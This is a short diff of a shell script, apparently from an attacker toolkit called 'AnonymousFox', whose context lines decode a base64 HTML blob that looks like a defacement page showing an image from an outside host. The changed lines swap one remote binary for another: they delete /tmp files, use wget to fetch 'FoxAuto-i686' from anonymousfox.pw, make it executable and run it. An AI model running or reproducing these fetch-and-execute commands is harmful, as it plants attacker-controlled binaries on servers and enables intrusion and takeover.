@@ -122,7 +122,7 @@ Cn0KPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPGNlbnRlcj4KPHByZT4KPGNlbnRlcj48aW1nIHNy
 Yz0iaHR0cDovL2QudG9wNHRvcC5uZXQvcF8yNDlhNGlqMS5wbmciPjwvY2VudGVyPgo8L3ByZT4K
 CjxkaXYgYWxpZ249ImNlbnRlciI+' | base64 -d
 
-rm -rf /tmp/service.hosting
-wget http://anonymousfox.pw/local/wso/ri686
-chmod +x ri686
-./ri686 0
+rm -rf /tmp/FoxAuto
+wget https://anonymousfox.pw/local/FoxAuto/FoxAuto-i686
+chmod +x FoxAuto-i686
+./FoxAuto-i686 0
